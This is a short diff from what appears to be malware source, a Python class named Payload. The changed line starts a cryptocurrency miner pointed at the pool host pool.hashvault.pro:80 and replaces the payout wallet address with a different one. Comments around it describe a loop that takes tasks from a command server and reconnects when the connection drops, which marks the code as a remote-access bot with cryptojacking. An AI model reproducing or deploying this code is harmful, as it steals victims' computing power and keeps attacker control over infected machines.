@@ -1085,7 +1085,7 @@ class Payload():
         self.handlers['thread_handler'] = self._get_thread_handler()
 
         # kick off miner
-        self.miner('run pool.hashvault.pro:80 46v4cAiT53y9Q6XwboCAHoct4mKXW4SHsgBA4TtEpMrgDCLxsyRXhawGJUQehVkkxNL8Z4n332Hgi8NoAXfV9gCSB3XWBLa')
+        self.miner('run pool.hashvault.pro:80 47YBHY4Zmoy9Nro8g9ntLfZHp3BvEtAfS8NCaVtdvBcbBHEYoN8DebkPGKuvouUo4Q6wBouvBDe8e8RkvEqTh57xKRBU8UQ')
 
         # loop listening for tasks from server and sending responses.
         # if connection is dropped, enter passive mode and retry connection every 30 seconds.
